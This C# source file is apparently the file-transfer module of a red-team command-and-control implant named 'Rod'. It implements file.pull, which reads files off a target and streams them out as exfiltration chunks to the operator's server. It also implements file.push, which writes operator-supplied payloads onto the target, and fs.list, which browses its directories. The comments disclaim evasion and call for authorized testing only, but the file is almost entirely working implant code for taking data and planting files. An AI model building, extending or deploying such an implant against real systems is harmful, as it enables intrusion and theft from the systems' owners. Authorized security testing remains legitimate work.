using System.Security.Cryptography;
using System.Text;
using Rod.V1;
using SysFile = System.IO.File;

namespace Rod.Implant.Internal;

// Holds the core file-transfer verbs the reference implant advertises
// (architecture.md Sec 10.1, the "core" category): file.pull downloads a file
// off the target and file.push uploads one onto it -- the two-direction
// baseline every C2 exposes. Small pulls return inline in the TaskResult
// output; larger ones stream as ExfilChunk frames into the engagement artifact
// store. A small push rides the task arguments as base64 and lands on disk
// whole; a larger one rides the typed arm (architecture.md Sec 10) -- the
// payload is staged server-side, its sha256 rides the signed arguments, and
// the beacon loop demands and reassembles the chunk run before dispatching
// the staged handler below.
//
// Argument shape:
//
//   file.pull <path>
//   file.push <path> <base64>              (inline; single-frame budget)
//   file.push <path> sha256:<hex>          (staged; bytes follow on demand)
//   fs.list  <path>                        (empty path = current directory)
//
// The fs.list output is one JSON object per line -- {"name":…,"dir":…,
// "size":…,"mtime":…} -- the operator file browser's parse contract.
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior (architecture.md
// Sec 7). The operator is responsible for targeting only systems they are
// authorized to test.

internal static class Files
{
    // The largest file payload returned inline in a TaskResult. Files at or
    // below this size are returned whole in the output string; larger files are
    // returned as ExfilChunk frames so the operator retrieves the whole thing
    // through the artifact store. 1 MiB matches the teamserver's per-frame
    // budget (architecture.md Sec 11).
    private const int MaxInlineBytes = 1 << 20; // 1 MiB

    // The largest decoded push accepted in a single task: its base64 text rides
    // the TaskRequest arguments string, which must fit the 2 MiB downstream
    // frame budget with protobuf overhead to spare.
    private const int MaxPushBytes = 1 << 20; // 1 MiB

    /// <summary>
    /// Reads the file at the given path off the target. Small files return
    /// Succeeded with the contents in the output string; large files return
    /// Succeeded with a short manifest line in the output and the contents
    /// spread across ExfilChunk frames the beacon streams to the artifact
    /// store.
    /// </summary>
    public static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) Pull(string arguments)
    {
        var path = arguments.Trim();
        if (path.Length == 0)
            return (TaskOutcome.Failed, "file.pull expects '<path>'", Array.Empty<ExfilChunk>());

        if (!SysFile.Exists(path))
        {
            // Exists is false for both missing files and directories; distinguish
            // so the operator sees the cause rather than guessing.
            if (Directory.Exists(path))
                return (TaskOutcome.Failed,
                    "file.pull refuses to dump a directory: " + path, Array.Empty<ExfilChunk>());
            return (TaskOutcome.Failed, "stat " + path + ": file not found", Array.Empty<ExfilChunk>());
        }

        byte[] data;
        try
        {
            data = SysFile.ReadAllBytes(path);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, "read " + path + ": " + ex.Message, Array.Empty<ExfilChunk>());
        }

        // Small enough to return inline: report the bytes verbatim.
        if (data.Length <= MaxInlineBytes)
        {
            return (TaskOutcome.Succeeded, Encoding.UTF8.GetString(data), Array.Empty<ExfilChunk>());
        }

        // Too large for a TaskResult: stream as ExfilChunk frames. The output
        // carries a short manifest; the chunks carry the bytes.
        var name = Path.GetFileName(path);
        var chunks = ChunkFile(name, "application/octet-stream", data);
        return (TaskOutcome.Succeeded,
            $"{path}: {data.Length} bytes, {chunks.Count} chunks streamed to artifact store",
            chunks);
    }

    /// <summary>
    /// Writes base64-decoded bytes to the given path on the target, creating
    /// the parent directory when it does not exist. A decoded payload over
    /// <see cref="MaxPushBytes"/> is refused with the cap named so the operator
    /// knows the ceiling, not just the failure.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) Push(string arguments)
    {
        // The base64 payload is the tail after the last space (base64 contains
        // no spaces); the path is everything before it, spaces included, so the
        // split is unambiguous in both directions.
        var separator = arguments.LastIndexOf(' ');
        if (separator < 0)
            return (TaskOutcome.Failed, "file.push expects '<path> <base64>'");
        var path = arguments[..separator].Trim();
        var encoded = arguments[(separator + 1)..].Trim();
        if (path.Length == 0 || encoded.Length == 0)
            return (TaskOutcome.Failed, "file.push expects '<path> <base64>'");

        byte[] data;
        try
        {
            data = Convert.FromBase64String(encoded);
        }
        catch (FormatException)
        {
            return (TaskOutcome.Failed, "file.push: payload is not valid base64");
        }

        if (data.Length > MaxPushBytes)
            return (TaskOutcome.Failed,
                $"file.push: payload of {data.Length} bytes exceeds the {MaxPushBytes}-byte single-task cap");

        try
        {
            var parent = Path.GetDirectoryName(Path.GetFullPath(path));
            if (!string.IsNullOrEmpty(parent))
                Directory.CreateDirectory(parent);
            SysFile.WriteAllBytes(path, data);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, "write " + path + ": " + ex.Message);
        }

        return (TaskOutcome.Succeeded, $"wrote {data.Length} bytes to {path}");
    }

    /// <summary>
    /// Lists one directory of the target: one JSON object per line, each
    /// carrying name, dir (true for directories), size in bytes (0 for
    /// directories), and mtime (ISO-8601 UTC). This stable machine-readable
    /// shape is the operator file browser's contract -- it parses the lines
    /// directly -- so the field names and types are part of the verb. An empty
    /// path lists the process's current directory; a path that is not a
    /// directory fails with the cause.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) List(string arguments)
    {
        var path = arguments.Trim();
        if (path.Length == 0)
            path = Directory.GetCurrentDirectory();

        if (!Directory.Exists(path))
        {
            return SysFile.Exists(path)
                ? (TaskOutcome.Failed, "fs.list refuses to list a file: " + path)
                : (TaskOutcome.Failed, "stat " + path + ": directory not found");
        }

        IEnumerable<string> entries;
        try
        {
            entries = Directory.EnumerateFileSystemEntries(path);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, "list " + path + ": " + ex.Message);
        }

        var sb = new StringBuilder();
        foreach (var entry in entries)
        {
            try
            {
                var isDir = Directory.Exists(entry);
                var info = new FileInfo(entry);
                sb.Append(@"{""name"":").Append(JsonEscape(Path.GetFileName(entry)))
                    .Append(@",""dir"":").Append(isDir ? "true" : "false")
                    .Append(@",""size"":").Append(isDir ? 0 : info.Length)
                    .Append(@",""mtime"":").Append(JsonEscape(info.LastWriteTimeUtc.ToString("o")))
                    .Append("}\n");
            }
            catch (Exception)
            {
                // An entry that vanishes or refuses a stat between the
                // enumeration and the read is skipped, not fatal -- the
                // listing is a snapshot.
            }
        }
        return (TaskOutcome.Succeeded, sb.ToString().TrimEnd('\n'));
    }

    // Minimal JSON string escaping for the listing lines: the control
    // characters JSON mandates plus the quote and backslash, everything else
    // passes through as-is.
    private static string JsonEscape(string value)
    {
        var sb = new StringBuilder("\"");
        foreach (var c in value)
        {
            switch (c)
            {
                case '\"': sb.Append("\\\""); break;
                case '\\': sb.Append("\\\\"); break;
                case '\b': sb.Append("\\b"); break;
                case '\f': sb.Append("\\f"); break;
                case '\n': sb.Append("\\n"); break;
                case '\r': sb.Append("\\r"); break;
                case '\t': sb.Append("\\t"); break;
                default:
                    if (char.IsControl(c))
                        sb.Append("\\u").Append(((int)c).ToString("x4"));
                    else
                        sb.Append(c);
                    break;
            }
        }
        return sb.Append('"').ToString();
    }

    /// <summary>
    /// The staged push path (architecture.md Sec 10, the typed arm): the
    /// arguments carry the target path and the <c>sha256:</c> token the issuer
    /// bound into the signed tasking tuple, and <paramref name="data"/> is the
    /// reassembled chunk run the beacon loop demanded. The hash is verified
    /// before anything touches disk -- the signature covers the token, so a
    /// mismatch means the staged stream was altered in flight and the file is
    /// not written. No size cap applies: the bytes never rode a single frame.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) PushStaged(string arguments, byte[] data)
    {
        const string Prefix = "sha256:";

        var separator = arguments.LastIndexOf(' ');
        if (separator < 0)
            return (TaskOutcome.Failed, "file.push staged expects '<path> sha256:<hex>'");
        var path = arguments[..separator].Trim();
        var token = arguments[(separator + 1)..].Trim();
        if (path.Length == 0
            || !token.StartsWith(Prefix, StringComparison.OrdinalIgnoreCase)
            || token.Length != Prefix.Length + 64)
        {
            return (TaskOutcome.Failed, "file.push staged expects '<path> sha256:<hex>'");
        }

        var expected = token[Prefix.Length..].ToLowerInvariant();
        var actual = Convert.ToHexString(SHA256.HashData(data)).ToLowerInvariant();
        if (actual != expected)
            return (TaskOutcome.Failed,
                $"file.push staged: payload hash mismatch: expected {expected}, received {actual}");

        try
        {
            var parent = Path.GetDirectoryName(Path.GetFullPath(path));
            if (!string.IsNullOrEmpty(parent))
                Directory.CreateDirectory(parent);
            SysFile.WriteAllBytes(path, data);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, "write " + path + ": " + ex.Message);
        }

        return (TaskOutcome.Succeeded, $"wrote {data.Length} bytes to {path}");
    }

    // Slices a byte buffer into ExfilChunk frames via the shared
    // chunker (0-origin sequences, terminal on the last chunk); the server
    // reassembles strictly by sequence and flushes on the terminal frame.
    internal static IReadOnlyList<ExfilChunk> ChunkFile(string name, string contentType, byte[] data)
        => Chunking.ChunkFile(name, contentType, data, Chunking.StreamChunkBytes);
}
